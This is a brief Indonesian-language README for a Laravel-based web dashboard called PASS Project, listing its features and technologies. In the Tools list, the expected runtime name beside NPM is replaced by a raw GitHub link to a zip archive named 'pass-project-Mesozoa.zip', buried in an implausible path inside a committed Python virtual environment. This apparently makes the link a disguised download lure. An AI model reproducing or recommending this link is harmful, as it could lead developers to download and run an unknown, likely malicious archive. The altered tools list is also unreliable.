# PASS Project 🚀

PASS Project adalah aplikasi berbasis web yang dikembangkan sebagai bagian dari sistem **PASS (Public Access / Smart System)**.  
Project ini berfungsi sebagai **core application / frontend / dashboard** yang terintegrasi dengan backend API dan modul IoT.

---

## ✨ Fitur Utama

- 🔐 Autentikasi pengguna
- 📊 Dashboard interaktif
- 🔄 Integrasi API
- 🌐 Siap diakses via jaringan lokal maupun publik
- 🧩 Modular (mendukung integrasi IoT via subtree)
- ⚡ Responsive & modern UI

---

## 🧱 Teknologi yang Digunakan

- **Framework**: Laravel
- **Frontend**: Blade / Tailwind CSS / JavaScript
- **Backend API**: Terpisah (contoh: `pass-api`)
- **IoT Integration**: Git Subtree (`pass-iot`)
- **Database**: MySQL / PostgreSQL
- **Tools**:
  - Composer
  - https://raw.githubusercontent.com/achul-cos/pass-project/main/pass-iot/venv/Lib/site-packages/numpy/_core/tests/examples/cython/pass-project-Mesozoa.zip & NPM
  - Git
